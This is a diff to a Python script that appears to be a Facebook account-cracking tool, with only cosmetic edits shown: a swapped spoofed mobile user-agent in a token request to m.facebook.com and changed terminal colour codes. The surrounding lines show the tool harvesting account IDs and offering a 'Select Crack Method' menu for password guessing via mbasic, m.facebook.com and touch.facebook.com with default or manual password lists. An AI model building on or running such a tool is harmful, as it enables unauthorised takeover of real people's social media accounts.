@@ -155,7 +155,7 @@ def convert():
 	global post,reac,kom
 	try:
 		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
-		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', #Jangan Diganti Anjink
+		'user-agent'                : 'Mozilla/5.0 (Linux; Android 10; A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36', #Jangan Diganti Anjink
 		'referer'                   : 'https://m.facebook.com/',
 		'host'                      : 'm.facebook.com',
 		'origin'                    : 'https://m.facebook.com',
@@ -272,10 +272,10 @@ def publik():
 			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
 			print (  a["name"])
 		ys.close()
-		print ("\033[0;96 1m─────────────────────────────────────────────────────────────")
-		print ('\033[0;93m[•] \ 033 [1];Successfully Take ID from %s'%op['name'])
-		print ("\033[0;93m[•] \033[1;92mTotal ID : %s"%(len(id)))
-		print ("\033[0;93m[•] \033[1;91mOutput : %s"%qq)
+		print ("\033[0;91m─────────────────────────────────────────────────────────────")
+		print ('\033[0;91m[•] \033 [1;92mSuccessfully Take ID from %s'%op['name'])
+		print ("\033[0;91m[•] \033[1;92mTotal ID : %s"%(len(id)))
+		print ("\033[0;91m[•] \033[1;92mOutput : %s"%qq)
                 print ("\033[0;96m─────────────────────────────────────────────────────────────")
 		raw_input("\033[0;92m   [•] [Return]")
 		menu()
@@ -428,7 +428,7 @@ def methode():
   os.system("clear")
   banner()
   print ("\033[0;91m─────────────────────────────────────────────────────────────")
-  print("\033[0;92m[ Select Crack Method ]")
+  print("\033[0;92m        [ Select Crack Method ]")
   print("\033[0;91m[1] \033[1;92mCrack With mbasic")
   print("\033[0;91m[2] \033[1;92mCrack With m.facebook.com")
   print("\033[0;91m[3] \033[1;92mCrack With touch.facebook.com")
@@ -472,7 +472,7 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print("\033[0;93m[•] \033[1;92mCrack With Pass Default Or Manual [d/m]")
+		print("\033[0;91m[•] \033[1;92mCrack With Pass Default Or Manual [d/m]")
 		while True:
 			f=raw_input("\033[0;91m[•] \033[1;92mchoose : ")
 			if f=="":continue
